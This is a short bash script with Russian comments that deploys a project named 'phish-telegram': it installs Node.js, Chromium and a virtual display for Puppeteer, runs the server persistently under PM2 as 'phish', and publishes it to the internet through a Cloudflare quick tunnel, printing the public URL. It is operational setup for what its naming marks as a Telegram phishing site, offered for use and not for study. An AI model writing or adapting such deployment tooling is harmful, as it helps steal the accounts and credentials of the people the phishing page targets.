#!/bin/bash
# Установка зависимостей
apt update
apt install -y nodejs npm chromium xvfb

# Клонирование
git clone https://github.com/твой-репозиторий/phish-telegram.git
cd phish-telegram

# Установка Node.js пакетов
npm install

# Запуск с виртуальным дисплеем (для Puppeteer)
Xvfb :99 -ac -screen 0 1280x1024x24 &
export DISPLAY=:99

# Запуск через PM2
npm install -g pm2
pm2 start server.js --name phish
pm2 save
pm2 startup

# Туннель Cloudflare (автоматически)
wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
chmod +x cloudflared
nohup ./cloudflared tunnel --url http://localhost:3000 > tunnel.log 2>&1 &

echo "✅ Сервер запущен"
echo "📡 URL туннеля:"
grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare\.com' tunnel.log | head -1
